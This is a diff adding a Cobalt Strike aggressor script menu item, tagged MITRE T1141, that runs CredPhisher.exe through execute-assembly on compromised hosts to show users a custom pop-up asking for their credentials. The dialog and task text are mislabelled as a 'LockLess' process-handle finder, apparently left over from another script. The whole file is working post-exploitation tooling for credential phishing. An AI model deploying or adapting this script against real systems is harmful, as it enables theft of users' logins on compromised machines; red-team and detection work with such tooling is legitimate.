@@ -1,0 +1,25 @@
+#Run Custom CredPhisher	
+	item "Prompt Custom Message  - T1141"{
+			local('$bid');
+				foreach $bid ($1){
+					custcredphisher($bid);
+				}
+			}
+
+# Phish Users with custom pop up box
+sub custcredphisher{
+ $bid = $1;
+    $dialog = dialog("LockLess: Find Which Process Has Handle On File", %(popu => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "\"$3['popu']\"";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Finding Process Handle....');
+            bexecute_assembly($bid, script_resource('exe/CredPhisher.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Custom Cred Phisher Prompt");
+    drow_text($dialog, "popu",  "Please Enter A Custom Pop Up Message:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
+}
